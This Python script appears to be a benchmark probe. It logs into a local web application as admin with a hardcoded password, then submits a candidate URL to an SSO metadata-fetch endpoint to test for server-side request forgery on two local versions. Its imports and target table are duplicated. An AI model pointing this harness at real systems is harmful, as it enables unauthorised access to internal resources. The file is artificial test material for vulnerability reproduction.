#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39730",
    "v1": "http://127.0.0.1:39731",
}
import argparse
import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
LOGIN_PATH = "/system/login.php"
FETCH_PATH = "/modules/sso/fetch_metadata.php"
ADMIN_PASSWORD = "Zx9Kp2wQ7vTr!42"
ADMIN_LOGIN = "admin"
ORG_SHORTNAME = "PCB"
BASE = {
    "v0": "http://127.0.0.1:39730",
    "v1": "http://127.0.0.1:39731",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    url = candidate["url"] if isinstance(candidate, dict) else str(candidate)
    op = _opener()
    logged_in = _login(op, base)
    target = f"{base}{FETCH_PATH}?url=" + urllib.parse.quote(url, safe="")
    status, body = _get(op, target, timeout=40)
    return {
        "version": version,
        "url": url,
        "logged_in": logged_in,
        "fetch_status": status,
        "fetched_body": body[:2000],
    }
def _login(opener, base) -> bool:
    st, html = _get(opener, f"{base}{LOGIN_PATH}")
    token = _csrf(html)
    if not token:
        return False
    st, body = _post(opener, f"{base}{LOGIN_PATH}?mode=check", {
        "adm_csrf_token": token,
        "usr_login_name": ADMIN_LOGIN,
        "usr_password": ADMIN_PASSWORD,
        "org_shortname": ORG_SHORTNAME,
    })
    return '"success"' in body
def _opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def _get(opener, url, timeout=30):
    req = urllib.request.Request(url, method="GET")
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, f"<http-error: {e}>"
def _post(opener, url, fields, timeout=60):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, f"<http-error: {e}>"
def _csrf(html):
    
    m = re.search(r'name="adm_csrf_token"[^>]*value="([^"]+)"', html)
    if not m:
        m = re.search(r'value="([^"]+)"[^>]*name="adm_csrf_token"', html)
    return m.group(1) if m else None


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))